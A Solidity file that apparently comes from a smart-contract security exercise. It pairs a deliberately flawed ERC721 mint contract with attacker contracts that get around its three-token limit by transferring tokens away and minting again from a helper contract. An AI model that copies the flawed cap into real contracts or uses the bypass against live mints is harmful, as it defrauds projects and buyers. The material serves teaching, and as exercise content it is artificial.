// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;
import "@openzeppelin/contracts/token/ERC721/ERC721.sol";

contract Overmint2 is ERC721 {
    using Address for address;
    uint256 public totalSupply;

    constructor() ERC721("Overmint2", "AT") {}

    function mint() external {
        require(balanceOf(msg.sender) <= 3, "max 3 NFTs");
        totalSupply++;
        _mint(msg.sender, totalSupply);
    }

    function success() external view returns (bool) {
        return balanceOf(msg.sender) == 5;
    }
}

contract Overmint2Attacker {
    constructor(Overmint2 victim) {
        victim.mint();
        victim.mint();
        victim.mint();

        victim.safeTransferFrom(address(this), msg.sender, 1);
        victim.safeTransferFrom(address(this), msg.sender, 2);
        victim.safeTransferFrom(address(this), msg.sender, 3);

        new Overmint2AttackerHelper(victim, msg.sender);
    }
}

contract Overmint2AttackerHelper {
    constructor(Overmint2 victim, address attacker) {
        victim.mint();
        victim.mint();

        victim.transferFrom(address(this), attacker, 4);
        victim.transferFrom(address(this), attacker, 5);
    }
}
